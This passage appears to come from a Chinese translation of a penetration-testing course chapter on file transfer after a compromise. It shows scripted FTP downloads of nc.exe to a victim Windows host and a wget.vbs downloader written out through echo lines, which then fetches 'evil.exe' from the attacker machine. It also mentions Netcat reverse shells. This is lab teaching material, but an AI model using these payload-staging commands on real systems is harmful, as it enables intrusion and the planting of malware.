

```
student@debian:~$ ftp 10.11.0.4
ftp 10.11.0.4
Connected to 10.11.0.4.
220---------- Welcome to Pure-FTPD [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 09:16. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
Name (10.11.0.4:student): offsec
offsec
331 User offsec OK. Password required
Password:offsec
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> bye
bye
221-Goodbye. You uploaded 0 and downloaded 0 kbytes.
221 Logout.
student@debian:~$
```

*清单 470 - 在我们的升级 shell 中使用交互式程序*

这次，我们到 FTP 服务器的交互式连接成功了（清单 470），当我们退出时，返回到了我们的升级后的 Bash 提示符。该技术有效地通过传统的非交互通道提供了一个交互式 shell，这是在 Linux 上将标准非交互 shell 升级的最受欢迎的方法之一。

### 16.1.3.2 练习

*（这些练习不需要报告结果）*

- 1. 在你的 Kali 系统上启动 Pure-FTPd FTP 服务器，使用 Debian 实验虚拟机上的 FTP 客户端连接到它，并观察交互式提示符是如何工作的。
- 2. 尝试从 Netcat 反向 shell 登录到 FTP 服务器，看看会发生什么。
- 3. 研究升级非交互 shell 的替代方法。

### 16.2 使用 Windows 主机传输文件

在类 Unix 环境中，我们通常会发现操作系统预装了如 Netcat、curl 或 wget 等工具，这使得从远程机器下载文件相对简单。然而，在 Windows 机器上，这个过程通常没有那么直接。在本节中，我们将探索基于 Windows 的机器上的文件传输选项。

### 16.2.1 非交互式 FTP 下载

Windows 操作系统附带了一个默认的 FTP 客户端，可用于文件传输。正如我们所看到的，FTP 客户端是一个交互式程序，需要输入才能完成，因此我们需要一个创造性的解决方案才能使用 FTP 进行文件传输。

**ftp** 的帮助选项（**-h**）有一些线索可能会对我们有帮助：

```
C:\Users\offsec> ftp -h
```

在运行 FTP 服务器服务（有时称为守护进程）的计算机之间传输文件。Ftp 可以交互使用。

```
FTP [-v] [-d] [-i] [-n] [-g] [-s:filename] [-a] [-A] [-x:sendbuffer] [-r:recvbuffer] [-b:asynbuffers] [-w:windowsize] [host]
```

| 选项 | 描述 |
| :--- | :--- |
| -v | 抑制显示远程服务器响应。 |
| -n | 抑制初始连接时的自动登录。 |
| -i | 关闭多个文件传输过程中的交互式提示。 |
| -d | 启用调试。 |
| -g | 禁用文件名通配符（参见 GLOB 命令）。 |
| -s:filename | 指定包含 FTP 命令的文本文件；这些命令将在 FTP 启动后自动运行。 |
| -a | 绑定数据连接时使用任何本地接口。 |
| -A | 以匿名身份登录。 |
| -x:send sockbuf | 覆盖默认的 SO_SNDBUF 大小 8192。 |
| -r:recv sockbuf | 覆盖默认的 SO_RCVBUF 大小 8192。 |
| -b:async count | 覆盖默认的异步计数 3 |
| -w:windowsize | 覆盖默认的传输缓冲区大小 65535。 |
| host | 指定要连接的远程主机的主机名或 IP 地址。 |

- 备注：
  - mgot 和 mput 命令接受 y/n/q 作为 是/否/退出。
  - 使用 Control-C 中止命令。

清单 471 - FTP 帮助显示

ftp -s 选项接受基于文本的命令行列表，这实际上使客户端变为非交互式。在我们的攻击机器上，我们将设置一个 FTP 服务器，并发起从受控 Windows 主机下载 Netcat 二进制的请求。

首先，我们将 nc.exe 的副本放入我们的 /ftphome 目录中：

```
kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
kali@kali:~$ ls /ftphome/
nc.exe
```

清单 472 - 确保 nc.exe 在 ftphome 目录中

我们已经在我们的 Kali 机器上安装并配置了 Pure-FTPd，但我们将重启它以确保服务可用：

```
kali@kali:~$ sudo systemctl restart pure-ftpd
```

清单 473 - 在 Kali 中重启 Pure-FTPd

接下来，我们将使用 echo 命令构建一个包含我们要执行的 FTP 命令的文本文件，如清单 474 所示。

该命令文件以 open 命令开头，该命令发起与指定 IP 地址的 FTP 连接。接下来，脚本将使用 USER 命令以 offsec 身份进行身份验证并提供密码 lab。此时，我们应该有一个成功通过身份验证的 FTP 连接，并且我们可以脚本化传输文件所需的命令。

我们将使用 **bin** 请求二进制文件传输，并发出 **GET** 请求获取 **nc.exe**。最后，我们将使用 **bye** 命令关闭连接：

```
C:\Users\offsec>echo open 10.11.0.4 > ftp.txt
C:\Users\offsec>echo USER offsec >> ftp.txt
C:\Users\offsec>echo lab >> ftp.txt
C:\Users\offsec>echo bin >> ftp.txt
C:\Users\offsec>echo GET nc.exe >> ftp.txt
C:\Users\offsec>echo bye >> ftp.txt
```

我们现在准备好使用命令行列表启动 FTP 会话了，这实际上使交互式会话变为非交互式。为此，我们将发出以下 FTP 命令：

```
C:\Users\offsec> ftp -v -n -s:ftp.txt
```

在上述列表中，我们使用 -v 来抑制任何返回的输出，-n 来抑制自动登录，-s 来指示我们的命令文件名称。

当清单 475 中的 ftp 命令运行时，我们的下载应该已经执行，并且当前目录中应该会出现一个可用的 **nc.exe** 副本：

```
C:\Users\offsec> ftp -v -n -s:ftp.txt
ftp> open 192.168.1.31 21
ftp> USER offsec

ftp> bin
ftp> GET nc.exe
ftp> bye

C:\Users\offsec> nc.exe -h
[v1.10 NT]
connect to somewhere:	nc [-options] hostname port[s] [ports] ...
listen for inboud:	nc -L -p port [options] [hostname] [port]
options:
        -d				detach from console, stealth mode
        -e prog			inbound program to exec [dangerous!!]
        -g gateway		source-routing hop point[s], up to 8
        -G num		source-routing pointer: 4, 8, 12, ...
        -h				this cruff
        -i secs			delay interval for lines sent, ports scanned
        -l				listen mode, for inboud connects
...
```

### 16.2.2 使用脚本语言进行 Windows 下载

我们可以利用 VBScript<sup>397</sup>（在 Windows XP, 2003 中）和 PowerShell（在 Windows 7, 2008 及更高版本中）等脚本引擎来将文件下载到我们的受害机器。例如，以下一组非交互式的 **echo** 命令，当粘贴到远程 shell 中时，将写出一个 **wget.vbs** 脚本，该脚本充当一个简单的 HTTP 下载器：

```
echo strUrl = WScript.Arguments.Item(0) >> wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 To UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Asc(MidB(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

我们可以使用 **cscript** 运行此脚本，以从我们的 Kali 机器下载文件：

```
C:\Users\Offsec> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
```

对于较新版本的 Windows，我们可以使用 PowerShell 作为更简单的下载替代方案。以下示例展示了使用 **System.Net.WebClient** PowerShell 类的下载脚本实现。<sup>398</sup>

<sup>397</sup> (维基百科, 2019). https://en.wikipedia.org/wiki/VBScript

